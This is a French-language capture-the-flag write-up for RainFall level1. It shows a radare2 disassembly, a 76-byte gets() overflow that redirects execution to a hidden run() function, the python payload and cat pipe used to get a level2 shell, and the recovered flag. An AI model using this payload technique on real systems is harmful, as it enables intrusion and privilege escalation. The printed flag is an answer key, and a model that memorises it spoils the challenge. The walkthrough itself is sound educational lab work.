@@ -1,0 +1,86 @@
+Avec radar2 on a pu remarquer que la fonction gets est utiliser
+
+[0x08048390]> pdf @main
+            ; DATA XREF from entry0 @ 0x80483a7
+┌ 23: int main (int argc, char **argv, char **envp);
+│           ; var char *s @ esp+0x10
+│           0x08048480      55             push ebp
+│           0x08048481      89e5           mov ebp, esp
+│           0x08048483      83e4f0         and esp, 0xfffffff0
+│           0x08048486      83ec50         sub esp, 0x50
+│           0x08048489      8d442410       lea eax, [s]
+│           0x0804848d      890424         mov dword [esp], eax        ; char *s
+│           0x08048490      e8abfeffff     call sym.imp.gets           ; char *gets(char *s)
+│           0x08048495      c9             leave
+└           0x08048496      c3             ret
+
+la fonction gets presente une vulnerabilite, si on depasse la taille du buffer qui lui est fournis on peut faire crash le programe. De cette maniere en faisant un :
+
+python -c 'print "*" * 76 + "\x90"' > /tmp/run
+
+puis en lancant gdb puis avec la commande r < /tmp/run
+
+on obtient : 
+
+Starting program: /home/user/level1/level1 < /tmp/run
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e400b2 in ?? () from /lib/i386-linux-gnu/libc.so.6
+
+Maintenant en faisant un info register : 
+
+eax            0xfffff6ea	-2326
+ecx            0xb7fd28c4	-1208145724
+edx            0xbffff6c0	-1073744192
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff710	0xbffff710
+ebp            0x2a2a2a2a	0x2a2a2a2a
+esi            0x0	0
+edi            0x0	0
+eip            0xb7e400b2	0xb7e400b2
+eflags         0x210282	[ SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+on peut voir a la 9 line le registre eip qui a partir de la va nous permettre d'injecter notre code pour qu'il execute a la place de ce qu'il etait sense faire
+
+0x080482f8  _init
+0x08048340  gets
+0x08048340  gets@plt
+0x08048350  fwrite
+0x08048350  fwrite@plt
+0x08048360  system
+0x08048360  system@plt
+0x08048370  __gmon_start__
+0x08048370  __gmon_start__@plt
+0x08048380  __libc_start_main
+0x08048380  __libc_start_main@plt
+0x08048390  _start
+0x080483c0  __do_global_dtors_aux
+0x08048420  frame_dummy
+0x08048444  run
+0x08048480  main
+0x080484a0  __libc_csu_init
+0x08048510  __libc_csu_fini
+0x08048512  __i686.get_pc_thunk.bx
+0x08048520  __do_global_ctors_aux
+0x0804854c  _fini
+
+au dessus du main on peut voir run. En recuperant la valeur hexa 0x08048444 et en la convertissant en little endian on obtient \x44\x84\x04\x08
+
+en utilisant python -c 'print "*" * 76 + "\x44\x84\x04\x08"' > /tmp/run
+
+puis en utilisant la commande cat /tmp/run - | ./level1
+
+level1@RainFall:~$ cat /tmp/run - | ./level1
+Good... Wait what?
+
+A ce moment en utilisant whoami on s'appercoi qu'on est dans un bash avec les droits du level2
+
+Et en executant cat /home/user/level2/.pass on obtient notre flag
+
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
